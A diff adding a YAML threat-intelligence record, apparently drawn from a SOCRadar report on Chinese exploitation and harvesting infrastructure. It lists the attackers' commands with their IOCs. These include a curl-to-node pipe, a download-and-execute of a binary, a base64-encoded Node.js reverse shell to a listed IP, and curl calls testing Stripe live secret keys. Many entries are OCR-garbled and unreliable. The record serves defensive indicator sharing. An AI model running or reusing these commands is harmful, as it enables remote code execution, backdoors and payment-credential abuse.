@@ -1,0 +1,87 @@
+title: 'Chinese Cybercrime Infrastructure Detected: Automated Exploitation & Harvesting
+  Infrastructure'
+description: The report details the usage of a Python script named oklink_unified_deploy.py
+  for deploying addresses across different blockchain networks, as well as multiple
+  attempts to access Stripe's balance using API keys.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes: []
+  command_lines:
+  - python3 2.py -w -u TARGET -c env
+  - python3 2.py -u TARGET -w -c curl https://soft-silence-d978.13544681192.workers.dev/ | node
+  - python3 2.py -w -c wget https://d6.tfdl.net/public/2026-04-07/3d0d43d6-3b6d-44e6-bbff-2404f83a66b6/hybrid -O /tmp/l64 && chmod +x /tmp/l64 && /tmp/l64 name dbus && rm /tmp/l64
+  - python3 2.py -w -c curl http://124.220.164.14:33306
+  - python3 3.py -w -c env -f 1.txt -o my_vulns.txt
+  - python3 3.py -w -c env -u TARGET
+  - python3 3.py -w -c echo KGZ1bmN0aW9uKCl7dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLGNwID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7dmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoMzMzMDYsICIxMjQuMjIwLjE2NC4xNCIsIGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTtyZXR1cm4gL2EvO30pKCk7 | base64 -d | node
+  - python oklink_unified_deploy.py --type btc --address <iil>
+  - python oklink_unified_deploy.py --type erc20 -file addresses.txt
+  - python oklink_unified_deploy.py --type trc2@ -file addresses.txt -loop
+  - python oklink_unified_deploy.py --setup-only
+  - python oklink_unified_deploy.py --type btc -file addresses.txt --tor
+  - python3 oklink unified deploy.py --url https://news om/txt/erc20.txt --type trc20  -threads 20 -~tor
+  - python3 oklink unified deploy.py -url https://news on/txt/erc20.txt --type erc20  ~threads 20 --tor
+  - python3 oklink unified deploy.py -url https://news om/txt/erc20.txt --type trc20  ~tor-proxy sockssh://127.0.0.1:9150 threads 50 ~d
+  - python3 oklink unified deploy.py -url https://news on/txt/erc20.txt --type erc20  ~tor-proxy sockssh://127.0.0.1:9150 threads 50 ~d --email 13544681192@163.con
+  - python3 oklink unified deploy.py {-url https://news on/txt/erc28.txt --type erc20  -threads 50 ~d| -email 13544681192163.con
+  powershell: []
+  scripts:
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  - curl https://api. stripe.con/vl/account -u sk_live 51SVf)4 il
+  - curl https://api.stripe.con/vvl/balance-u sk live 51SVflA gL
+  - curl https://api.stripe.con/vvl/balance -u sk live 51SVflA gil
+  - curl https://api.stripe.con/vl/balance -u ssk_live SIMLVK_ o=
+  - curl https://api.stripe.con/vl/balance -ucurl https://api.stripe.con/vl/balance -u sk live SIMLVKy| ek
+  - curl https://api.stripe.con/1/account -u sk_live SIMLVKD. K
+  - curl https://api.stripe.con/vvl/account -u sk_live 5IMLVKy| InEK
+  - curl https://api.stripe.con/vl/account ~u sk_live 5IMLVKyl 8 8 nEK
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - python3 -> soft-silence-d978.13544681192.workers.dev:443
+  - python3 -> mainnet-seed-0004.nkn.org:30003
+  - python3 -> mainnet-seed-0012.nkn.org:30003
+  - python3 -> mainnet-seed-0020.nkn.org:30003
+  - python3 oklink unified deploy.py -> https[.]com/txt/erc20.txt:443
+  - curl -> https[.]stripe[.]con/vl/account:443
+  - curl -> https[.]stripe[.]con/vvl/balance:443
+  file_activity:
+  - /tmp/l64
+  - addresses.txt
+  - txt_trc.txt
+  persistence:
+  - Cloudflare tunnel (cf-client name sshd wss://*.trycloudflare.com/ws)
+  - P2P client (client name mayun)
+  - Backdoors (d2- pl)
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 124.220.164.14
+  domains:
+  - kf.unpkg.top
+  - anson-aeromarine-ocularly.ngrok-free.dev
+  - soft-silence-d978.13544681192.workers.dev
+  - d6.tfdl.net
+  - mainnet-seed-0004.nkn.org
+  - mainnet-seed-0012.nkn.org
+  - mainnet-seed-0020.nkn.org
+  - news om
+  - stripe con
+  urls:
+  - https://d6.tfdl.net/public/2026-04-07/a946d7de-2525-4189-bf4f-c3f4eec7a8ff/client.mjs
+  - https://d6.tfdl.net/public/2026-04-07/5777281b-9243-4169-8faa-af60d7904c01/cf-client
+  - https://d6.tfdl.net/public/2026-04-07/3d0d43d6-3b6d-44e6-bbff-2404f83a66b6/hybrid
+  - http://mainnet-seed-0004.nkn.org:30003
+  - http://mainnet-seed-0012.nkn.org:30003
+  - http://mainnet-seed-0020.nkn.org:30003
+  - https[.]com/txt/erc20.txt
+  - https[.]stripe[.]con/vl/account
+  - https[.]stripe[.]con/vvl/balance
+authors:
+- SOCRadar Threat Research Team
+reference: https://socradar.io/blog/chinese-cybercrime-exploitation-harvesting
+date_of_publication: April 30, 2026
+file_creation_date: May 01, 2026
